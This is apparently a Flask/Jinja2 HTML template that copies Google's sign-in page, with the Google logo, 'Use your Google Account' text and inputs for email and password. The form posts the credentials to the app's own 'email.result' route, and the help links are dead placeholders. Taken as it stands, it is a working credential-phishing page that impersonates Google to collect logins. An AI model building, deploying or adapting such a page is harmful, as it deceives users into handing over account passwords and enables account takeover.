{% extends "base.html" %}

{% block content %}

<div class="container">
    <div class="row justify-content-center mt-5">
        <div class="col-md-5">

            <div class="card shadow-lg border-0">
                <div class="card-body p-5">

                    <div class="text-center">
                        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
                            width="92" alt="Google Logo">

                        <h3 class="mt-4">Sign in</h3>

                        <p class="text-muted">
                            Use your Google Account
                        </p>
                    </div>

                    <form method="POST" action="{{ url_for('email.result') }}">

                        <div class="mb-3">
                            <input type="email" name="email" class="form-control" placeholder="Email or phone" required>
                        </div>

                        <div class="mb-4">
                            <input type="password" name="password" class="form-control" placeholder="Password" required>
                        </div>

                        <div class="mb-3">
                            <a href="#" class="text-decoration-none">
                                Forgot email?
                            </a>
                        </div>

                        <div class="d-flex justify-content-between align-items-center">

                            <a href="#" class="text-decoration-none">
                                Create account
                            </a>

                            <button type="submit" class="btn btn-primary">
                                Next
                            </button>

                        </div>

                    </form>

                </div>
            </div>

        </div>
    </div>
</div>

{% endblock %}
